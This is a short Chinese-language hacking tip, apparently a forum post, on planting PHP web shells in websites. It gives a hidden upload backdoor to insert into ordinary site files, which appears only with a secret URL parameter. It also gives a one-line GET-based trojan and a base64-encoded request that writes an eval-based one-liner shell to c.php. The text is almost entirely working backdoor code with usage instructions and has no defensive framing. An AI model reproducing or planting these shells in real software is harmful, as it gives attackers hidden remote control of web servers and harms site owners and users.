<?php if($_GET["woaini"]=="91ri"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?>



将以上代码插入正常文件中，直接访问该文件无任何变化但在文件末尾加上?woaini=91ri即可显示出小马(直接上传文件的那种)


<?php $_GET[a]($_GET[b]);?>
复制代码
仅用GET函数就构成了木马；
利用方法：

?a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};
复制代码
执行后当前目录生成c.php一句话木马
（PS:当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马）